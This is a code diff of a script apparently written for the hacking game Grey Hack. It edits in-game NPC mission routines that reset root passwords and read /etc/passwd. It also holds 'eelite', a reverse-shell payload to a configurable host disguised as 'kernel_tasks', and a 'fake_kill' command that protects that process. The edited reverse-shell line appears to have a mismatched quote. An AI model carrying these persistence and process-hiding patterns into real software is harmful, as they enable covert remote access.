@@ -303,8 +303,6 @@ NPC["run_task"] = function(mObj, id, label, target, target_ip, target_lan, data)
 	objects = [globals.Shells, globals.Computers, globals.Files]
 	if globals.Shells.len == 1 and globals.Computers.len == 1 and globals.Files.len == 1 and globals.Others.len == 1 then return print(warning+"npc: failed to inject")
 	for obj in objects
-		this = false
-		that = false
 		for o in obj
 			viable = null				
 			if o[1] == "MAIN" then continue
@@ -347,7 +345,6 @@ NPC["run_task"] = function(mObj, id, label, target, target_ip, target_lan, data)
 				if viable then result = NPC.complete(mObj, id, viable)
 				continue
 			else
-				if that == true then print("we have a case of this and that")
 				// objects			
 				u = Utils.user(o[0])
 				n = Utils.handle(o[0])
@@ -361,15 +358,15 @@ NPC["run_task"] = function(mObj, id, label, target, target_ip, target_lan, data)
 				if label == "credentials" then
 					print(label) 
 					if u == "root" then
-						print(color.white+"ROOT DETECTED")
-						p = "any"
+						print(color.purple+"!! ROOT DETECTED !!--> "+color.cap+o_mut.public_ip)
+						p = target
 						if target == "any" then p = "root"
 						attempt = o_mut.change_password(p, "pass")
 						if attempt == 1 then result = NPC.complete(mObj, id, "pass")
 						if result then break
 					end if
 					if not o_mut.File("/etc/passwd") then return print(warning+"no /etc/passwd found")
-					if not o_mut.File("/etc/passwd").has_permission("r") then return print(warning+"!r/etc/passwd")
+					if not o_mut.File("/etc/passwd").has_permission("r") then continue
 					content = o_mut.File("/etc/passwd").get_content
 					if content.len == 0 then continue 
 					if target == "any" then
@@ -409,16 +406,6 @@ end function
 ///======================= MISSION =========================///
 // object: ShellObject
 // mission: pw - credentials mission
-//[	"", 
-//	"From: Incham@dredian.com", 
-//	"Subject: Mission Contract", 
-//	"Client wants to change some grades in his academic record. The remote ip of the victim is 211.24.113.31", 
-//	"The LAN address where the database is located is 10.0.2.2", "", "If you can not access directly, you can try to access through a teacher's computer in the local network.", 
-//	"", 
-//	"The record to modify belongs to: Ettie Moneys.", "Client wants to modify the subject Physics to increase the academic qualification by at least one point.", 
-//	"", 
-//	""
-//]
 NPC["mission"] = function(object, mission, amount = null)
 	//if not amount then return print(warning+"npc: invalid args")
 	//amount = amount.to_int
@@ -426,7 +413,7 @@ NPC["mission"] = function(object, mission, amount = null)
 	if typeof(obj) == "file" then return
 	if typeof(obj) == "shell" or typeof(obj) == "ftpshell" then obj = obj.host_computer
 	if obj.public_ip != MAIL_IP then return print("nah")
-																										locals.mail = mail_login(MAIL, MAIL_PW)
+	locals.mail = mail_login(MAIL, MAIL_PW)
 	if typeof(locals.mail) == "string" then return
 	print(init+color.grey+"<i> beginning NPC mission . . .")
 	print("<color=green>Auth --> <b>OK")
@@ -469,16 +456,17 @@ NPC["mission"] = function(object, mission, amount = null)
 		if globals.anonymous == false then target_ip_label = target_ip 
 		current_task_label = "Beginning assessment . . ." 
 		
-		while fishing == true
+		//while fishing == true
 			mission_result = null
 			mission_complete = null
 			print(color.red+color.fill+color.fill+"\nMISSION: "+color.white+label+"\ntargeting: "+color.white+target+"\nIP: "+color.white+target_ip_label+"\nLAN: "+color.white+target_lan+"\nSTATUS: "+color.white+current_task_label+"\n"+color.red+color.fill+color.fill)
 			mission_result = NPC.run_task(locals.mail, id, label, target, target_ip, target_lan)
 			print(color.red+color.fill+color.fill+"\nMISSION: "+color.white+label+"\ntargeting: "+color.white+target+"\nIP: "+color.white+target_ip_label+"\nLAN: "+color.white+target_lan+"\nSTATUS: "+color.white+current_task_label+"\n"+color.red+color.fill+color.fill)
 			if mission_result then mission_complete = NPC.complete(locals.mail, id, mission_result)
-			fishing = false 
-			break;
-		end while
+
+		//	fishing = false 
+		//	break;
+		//end while
 	end for
 end function
 ///======================= DUNGEON SEEKER =========================///
@@ -534,7 +522,6 @@ NPC["dungeon_seeker"] = function()
 					while newFiles.len
 						if resulting_ip then break
 						currFile=newFiles.pull;
-						print(currFile.name)
 						if currFile.is_folder then newFiles=newFiles+currFile.get_folders+currFile.get_files;
 						if currFile.name == "DungeonSeeker" then resulting_ip = mut.public_ip
 					end while
@@ -733,7 +720,7 @@ end function
 ///======================= binaries =========================///
 BAM.bin = [
 {"name":"fake_kill", "str": "PID = params[0].to_int;if typeof(PID) != 'number' then exit('The PID must be a number' + command_info('kill_usage'));processes = get_shell.host_computer.show_procs;process_list = processes.split('\n');for process in process_list@parsed = process.split(' ');process_pid = parsed[1];process_cmd = parsed[4];if PID == process_pid.to_int and process_cmd == 'kernel_tasks' then exit('Permission denied. Process protected.');end for@output = get_shell.host_computer.close_program(PID);if output == true then exit('Process ' + PID + ' closed');if output then exit(output);print('Process ' + PID + ' not found');"},
-{"name":"eelite", "str": "mxf=null;root=get_shell.host_computer.File('/');newFiles=root.get_folders+root.get_files;while newFiles.len;currFile=newFiles.pull;if currFile.is_folder then newFiles=newFiles+currFile.get_folders+currFile.get_files;test=include_lib(currFile.path);if typeof(test) == 'MetaxploitLib' then;mxf=currFile.path;break;end if;end while;rshelled=0;ps=get_shell.host_computer.show_procs;for proc in ps.split(char(10))[1:];proc=proc.split(' ');if proc[-1] == 'kernel_tasks' then rshelled=1;end for;if not rshelled then ;if mxf then include_lib(mxf).rshell_client('144.2.4.3',1222,'kernel_tasks');end if"},
+{"name":"eelite", "str": "mxf=null;root=get_shell.host_computer.File('/');newFiles=root.get_folders+root.get_files;while newFiles.len;currFile=newFiles.pull;if currFile.is_folder then newFiles=newFiles+currFile.get_folders+currFile.get_files;test=include_lib(currFile.path);if typeof(test) == 'MetaxploitLib' then;mxf=currFile.path;break;end if;end while;rshelled=0;ps=get_shell.host_computer.show_procs;for proc in ps.split(char(10))[1:];proc=proc.split(' ');if proc[-1] == 'kernel_tasks' then rshelled=1;end for;if not rshelled then ;if mxf then include_lib(mxf).rshell_client('"+RSHELL+",1222,'kernel_tasks');end if"},
 {"name":"time", "str": "print()"},
 
 ]
